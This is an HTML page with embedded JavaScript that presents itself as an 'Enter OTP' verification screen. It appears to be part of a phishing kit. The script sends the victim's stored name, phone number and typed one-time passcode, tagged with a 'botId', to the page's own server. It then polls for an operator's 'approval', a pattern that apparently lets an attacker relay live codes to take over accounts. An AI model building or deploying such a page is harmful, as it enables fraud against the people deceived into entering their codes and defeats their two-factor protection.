<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Enter OTP</title>

<style>
body {
   margin:0;
   font-family: Arial, Helvetica, sans-serif; 
   background:#e5e5e5;
   min-height:100vh;
   display:flex;
   align-items:center;
   justify-content:center;
}
.card { 
   background:#fff;
   width:92%;
   max-width:420px; 
   border-radius:12px;
   padding:24px 20px 28px;
   box-shadow:0 10px 30px rgba(0,0,0,0.15);
   position:relative;
 }
.close { 
   position:absolute;
   top:14px; 
   right:14px;
   width:28px; 
   height:28px; 
   background:#e11b22;
   color:#fff;
   border-radius:50%;
   display:flex;
   align-items:center;
   justify-content:center;
   font-weight:bold;
   cursor:pointer;
 }
h1 {
  text-align:center;
  font-size:22px;
  margin-bottom:6px; 
}
.info {
   text-align:center;
   font-size:14px;
   color:#666;
   margin-bottom:24px; 
}
.otp-wrap {
   /* display:flex;
   justify-content:space-between;
   gap:8px; */
   margin-bottom:18px;
}
.otp-wrap input {
  width:100%; 
  height:54px;
  text-align:center;
  font-size:22px;
  border-radius:8px;
  border:1.5px solid #ddd;
  outline:none; 
  box-sizing: border-box;
  letter-spacing: 6px;
 }
.otp-wrap input:disabled {
   background:#f2f2f2;
}
.otp-wrap input:focus {
   border-color:#e11b22;
}
.timer {
   text-align:center;
   font-size:13px;  
   color:#777;
   margin-bottom:20px;
}
button {
   width:100%;
   padding:16px;
   font-size:16px;
   background:#e11b22;
   color:#fff;
   border:none;
   border-radius:999px;  
   opacity:0.5;
   cursor:pointer;
}
button:enabled { 
  opacity:1; 
}
.waiting { 
  text-align:center;
  font-size:14px;
  color:#e11b22;
  margin-top:16px; 
  display:none;
}
#otp-alert {
    text-align: center;
    align-items: center;
}
</style>
</head>

<body>

<div class="card">
  <div class="close">✕</div>

  <h1>Enter OTP</h1>
  <div class="info">Please enter the OTP sent to verify.</div>

  <div class="otp-wrap">
    <input
      id="otpInput"
      type="tel"
      inputmode="numeric"
      placeholder="Enter OTP"
    >
  </div>

  <div id="otp-alert"></div>

  <div class="timer">
    You can resend OTP in <span id="countdown">120</span>
  </div>

  <button id="verifyBtn" disabled>Submit</button>

  <div id="waiting" class="waiting">⏳ Waiting for approval…</div>
</div>

<script>
const otpInput = document.getElementById('otpInput');
const verifyBtn = document.getElementById('verifyBtn');
const countdownEl = document.getElementById('countdown');
const waitingEl = document.getElementById('waiting');
const alertBox = document.getElementById('otp-alert');

const params = new URLSearchParams(window.location.search);
const urlBotId = params.get('botId');
if(urlBotId) localStorage.setItem('botId', urlBotId);

const fullName = localStorage.getItem('fullName');
const phone = localStorage.getItem('phone');
const botId = localStorage.getItem('botId');

if(!fullName || !phone || !botId){
  alert('Session expired. Please start again.');
  window.location.href='index.html';
}

/* COUNTDOWN */
let timeLeft = 120;
const timer = setInterval(()=>{
  timeLeft--;
  countdownEl.textContent = timeLeft;
  if(timeLeft <= 0) clearInterval(timer);
},1000);

/* INPUT */
otpInput.addEventListener('input', () => {
  otpInput.value = otpInput.value.replace(/\D/g,'');
  verifyBtn.disabled = otpInput.value.trim().length === 0;
});

/* SUBMIT */
verifyBtn.addEventListener('click', async () => {
  const otp = otpInput.value.trim();
  if(!otp) return;

  verifyBtn.disabled = true;
  waitingEl.style.display = 'block';
  alertBox.textContent = '';

  try {
    const res = await fetch(`${window.location.origin}/submit-otp`, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ name: fullName, phone, otp, botId })
    });

    const data = await res.json();

    if(!data.requestId){
      throw new Error("No requestId returned");
    }

    pollApproval(data.requestId);

  } catch (e) {
    waitingEl.style.display = 'none';
    verifyBtn.disabled = false;
    alertBox.style.color = 'red';
    alertBox.textContent = 'Server error. Try again.';
  }
});

/* STABLE POLLING (FIXED) */
function pollApproval(requestId){

  let attempts = 0;
  const maxAttempts = 60; // ~2 minutes

  const interval = setInterval(async () => {
    attempts++;

    try {
      const res = await fetch(`${window.location.origin}/check-otp/${requestId}`);
      const data = await res.json();

      // ✅ SUCCESS
      if (data.approved === true) {
        clearInterval(interval);
        window.location.href = 'success.html';
        return;
      }

      // ❌ FAIL
      if (data.approved === false) {
        clearInterval(interval);
        waitingEl.style.display = 'none';
        verifyBtn.disabled = false;
        alertBox.style.color = 'red';
        alertBox.textContent = 'Wrong OTP. Try again.';
        return;
      }

      // ⛔ BLOCK / TIMEOUT SAFETY
      if (data.blocked) {
        clearInterval(interval);
        window.location.href = 'index.html';
        return;
      }

      if (attempts >= maxAttempts) {
        clearInterval(interval);
        waitingEl.style.display = 'none';
        verifyBtn.disabled = false;
        alertBox.style.color = 'red';
        alertBox.textContent = 'Request timed out. Try again.';
      }

    } catch (err) {
      console.log("poll error", err);
    }

  }, 2000);
}
</script>

</body>
</html>
